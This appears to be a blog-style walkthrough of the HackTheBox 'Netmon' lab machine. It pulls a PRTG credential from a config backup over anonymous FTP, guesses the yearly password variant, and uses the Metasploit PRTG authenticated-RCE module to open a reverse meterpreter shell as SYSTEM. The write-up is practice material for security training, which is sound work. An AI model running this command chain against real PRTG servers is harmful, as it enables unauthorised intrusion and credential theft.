# Netmon WalkThrough

{% embed url="https://ethicalhacs.com/netmon-hackthebox-walkthrough/" %}

This is [**Netmon HackTheBox**](https://ethicalhacs.com/netmon-hackthebox-walkthrough) machine walkthrough and is also the **`24th`** machine of our **`OSCP like HTB Boxes`** series. In this writeup I have demonstrated step-by-step how I rooted to **`Netmon HackTheBox`** machine. But, before diving into the hacking part let us know something about this box. It is a **`Windows OS`** machine with IP address **`10.10.10.152`** and difficulty **`easy`** assigned by its maker.

Since this machine is **`retired`** so you will require **VIP** subscription at **hackthebox.eu** to access this machine. So first of all connect your **Kali/Parrot** machine with **`HackTheBox VPN`** and confirm your connectivity with this machine by pinging its **IP 10.10.10.152**. If all goes correct then start hacking.

As usual I started by scanning the machine with **Nmap**. Scanning gives us some idea how we have to proceed further like it helps to find open and closed ports and gives us information of different services running over them. I have used **`Nmap`** for this task and the result is given below:-

## **Scanning**

### **`$ sudo nmap -sC -sV -sT -T3 -oA nmap/Netmon 10.10.10.152`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2021/02/nmap-scan-in-netmon.jpg" alt="Performing nmap scan during Netmon hackthebox walkthrough" height="894" width="911"><figcaption></figcaption></figure>

**Nmap** found many number of ports as open. Among these ports port number **21** and **80** are most important because **`anonymous`** login is allowed on port **`21`** where **`ftpd server`** is running. **`Httpd server`** is running over port **80** and port **80** has more **attack surface** as compared to other ports. **Nmap** script **`http-server-header`** revealed that it is using **`PRTG 18.1.37`** web server for hosting website over it. You can also confirm the server version by checking **http response header** of the server. It gives almost **100 %** **correct** answer.

## **Banner Grabbing Server Version**

### **`$ curl --head -L http://10.10.10.152/index.htm`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2021/02/curl-command-on-netmon.png" alt="Checking Server software version using http-response header" height="316" width="689"><figcaption></figcaption></figure>

**Response header** revealed the web server version which is **`PRTG 18.1.37`**. Soon I get any **software** and its **version** my next step is to search for available exploit for particular version. This time too I did the same thing.

## **Searching For Available Exploits**

### **`$ searchsploit PRTG`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2021/02/searchsploit-on-netmon-1024x202.png" alt="Searching for available exploit during Netmon hackthebox walkthrough" height="202" width="1024"><figcaption></figcaption></figure>

**`$ Searchsploit`** (Kali tool to query exploit-db database offline) revealed that **PRTG Network Monitor `18.2.38`** is affected with **`authenticated RCE`**. So to use this exploit we need a valid credential. After going to [**http://10.10.10.152**](http://10.10.10.152/)  redirected to login page. Then tried to login with its **default** credential **`prtgadmin`**: **`prtgadmin`** and some other well-known credentials like **`admin`**: **`admin`**, **`admin`**: **`password`** but nothing worked.

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2021/02/login-panel-of-PRTG.png" alt="PTRG network monitor web server" height="324" width="929"><figcaption></figcaption></figure>

We also have **`anonymous login`** allowed on ftp server. Let us explore whether we can get anything interesting from the **ftp** **shared** folder. After some **initial enumeration** I could download **`user.txt`** file from **`C:\Users\Public\`** further I could not find any way by which I could get shell. I tried to **`upload`** some **`webshell`** in PRTG web directory, but file upload is not allowed.

Then I thought if web application requires some credential so that credential must be present in some **configuration file** from which it authenticate the user. After some **googling** I found the location where **PRTG Monitor** stores its users' credential. Check [**this**](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data) link for more info. It revealed that it stores data at directory **`\ProgramData\\Paessler\\"PRTG Network Monitor"\`**. After accessing the folder **`PRTG network Monitor`** found many configuration files. Didn’t know which would be helpful that’s why I downloaded all of them to my Kali machine for further analysis.

## **Logging To FTP Account**

### **`$ ftp 10.10.10.152`**

**Username : `anonymous`**

**Password : `anything`**

**`ftp> cd \\ProgramData\\Paessler\\"PRTG Network Monitor"\\`**

**`ftp> ls`**

**`ftp> get "PRTG Configuration.old.bak"`**

**`ftp> exit`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2021/02/anonymous-login-in-Netmon-ftp.png" alt="Ftp anonymous login during Netmon hackthebox walkthrough" height="741" width="839"><figcaption></figcaption></figure>

After analyzing all the other configuration files I could not find anything special in them but I found a **username** and a **password** in **`PRTG Configuration.old.bak`** file.

### **Extracting Password From Backup File**

**`$ grep -A3 -B3 -i prtgadmin 'PRTG Configuration.old.bak'`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2021/02/configuration-dat-file-in-netmon.png" alt="configuration file of PRTG network monitor found during  Netmon hackthebox walkthrough" height="419" width="837"><figcaption></figcaption></figure>

The extracted credential is **`prtgadmin`**: **`PrTg@dmin2018`**. When I tried to login at URL [**http://10.10.10.152/public/login.htm?loginurl=%2Fwelcome.htm\&errormsg**](http://10.10.10.152/public/login.htm?loginurl=%2Fwelcome.htm\&errormsg)**=** using this credential it gave me **login failed**. But when I tried to login using the creds **`prtgadmin`**: **`PrTg@dmin2019`** I logged in successfully. I updated the password from **`PrTg@dmin2018`** to **`PrTg@dmin2019`** just to test whether this password is being updated by every year and it do. Anyway, let us move to run our exploit to get **Remote Code Execution** on Netmon machine.

After some googling I found that a **metasploit module** for **PRTG Monitor Authenticated RCE** is also present. Check [**this**](https://sploitus.com/?query=prtg%20network%20monitor#exploits) link for more info and the module is **`exploit/windows/http/prtg_authenticated_rce`**.

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2021/02/Sploitus-result-in-netmon.png" alt="Searching exploit over sploitus.com" height="647" width="957"><figcaption></figcaption></figure>

So let us exploit this machine to get user shell on our machine.

#### **Getting User Shell**

**`msf6 > search prtg`**

**`msf6 > use exploit/windows/http/prtg_authenticated_rce`**

**`msf6 exploit(windows/http/prtg_authenticated_rce) > set RHOSTS 10.10.10.152`**

**`msf6 exploit(windows/http/prtg_authenticated_rce) > set PAYLOAD windows/meterpreter/reverse_tcp`**

**`msf6 exploit(windows/http/prtg_authenticated_rce) > set ADMIN_USERNAME prtgadmin`**

**`msf6 exploit(windows/http/prtg_authenticated_rce) > set ADMIN_PASSWORD PrTg@dmin2019`**

**`msf6 exploit(windows/http/prtg_authenticated_rce) > set LHOST 10.10.14.7`**

**`msf6 exploit(windows/http/prtg_authenticated_rce) > set VHOST 10.10.14.7`**

**`msf6 exploit(windows/http/prtg_authenticated_rce) > exploit`**

**`meterpreter > sysinfo`**

**`meterpreter > getuid`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2021/02/Getting-shell-in-netmon-1024x749.png" alt="Getting user shell during Netmon hackthebox walkthrough" height="749" width="1024"><figcaption></figcaption></figure>

We got a meterpreter shell and that too with the **`NT AUTHORITY\SYSTEM`** privilege. This shell is elevated because **PRTG Software** is running as **Admin User Privilege**. Let us capture user and root flag from their respective directories.

#### **Capture User & Root Flag**

**`meterpreter > search -f user.txt C:\\Users\\Public\\Desktop\\`**

**`meterpreter > cat "c:\Users\Public\Desktop\user.txt"`**

**`meterpreter > search -f root.txt C:\\Administrator\\`**

**`meterpreter > cat "c:\Users\Administrator\Desktop\root.txt"`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2021/02/User-and-root-flag-in-netmon.png" alt="Capturing user and root flag in Netmon HTB walkthrough" height="259" width="839"><figcaption></figcaption></figure>

This was how I rooted [**Netmon HackTheBox**](https://ethicalhacs.com/netmon-hackthebox-walkthrough) machine. Learnt a lot after this challenge, hope you have also learnt some new things. Thanks for reading this walkthrough. For any query and suggestion related to walkthrough feel free to write us at **ethicalhacs@gmail.com**.
